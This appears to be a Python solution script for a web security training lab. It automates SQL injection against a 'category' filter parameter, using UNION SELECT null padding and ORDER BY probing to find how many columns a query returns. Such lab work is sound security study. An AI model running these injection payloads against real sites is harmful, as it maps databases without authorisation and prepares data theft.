import requests as r  
from time import sleep


# lab name:  injection UNION attack, determining the number of columns returned by the query


link="" # link of the lab without the last backslash

vuln_param = "/filter?category="


# solution 1 using union operator
def solution1():
    response="Internal Server Error"
    num_column = 0
    payload ="Gifts\' union select "

    while "Error"  in response:
        if num_column ==0:
            payload += "null"
        else:
            payload+=",null"
        
        final_link =link + vuln_param + payload + " --"
        my_req= r.get(final_link)
        num_column+=1
        response = my_req.text
        print(final_link)

        sleep(0.5)


    print("Found number of column : ", num_column)




# solution 2 using union operator
def solution2():
    num_col=0
    response=''
    payload = "Gifts\' order by "
    while "Error" not in response:
        num_col+=1
        
        new_payload = payload + str(num_col)
        full_link = link + vuln_param + new_payload + " --"
        my_req= r.get(full_link)
        response = my_req.text
        print("payload : ", full_link)
        sleep(0.4)
    
    print("found number of columns : ", num_col-1)


